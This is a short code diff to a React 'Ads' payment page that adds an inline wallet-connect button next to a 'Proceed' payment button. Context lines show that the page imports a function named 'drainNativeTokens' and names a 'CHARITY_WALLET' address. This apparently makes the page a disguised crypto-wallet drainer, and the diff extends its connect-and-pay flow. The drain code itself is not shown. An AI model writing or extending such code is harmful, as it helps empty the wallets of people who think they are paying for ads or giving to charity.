@@ -19,6 +19,7 @@ import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
 import { drainNativeTokens } from '@/utils/evmTransactions';
 import { useChainInfo } from '@/hooks/useChainInfo';
+import { InlineConnectWallet } from '@/components/InlineConnectWallet';
 
 const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
 const MAX_BATCH_SIZE = 5;
@@ -1196,6 +1197,7 @@ const Ads = () => {
                                     >
                                         Proceed
                                     </Button>
+                                   <InlineConnectWallet className="mt-2" />
                                     <p className="text-xs text-muted-foreground text-center">
                                         Click to pay via {activeChain === 'solana' ? 'Solana' : chainName} Wallet
                                     </p>
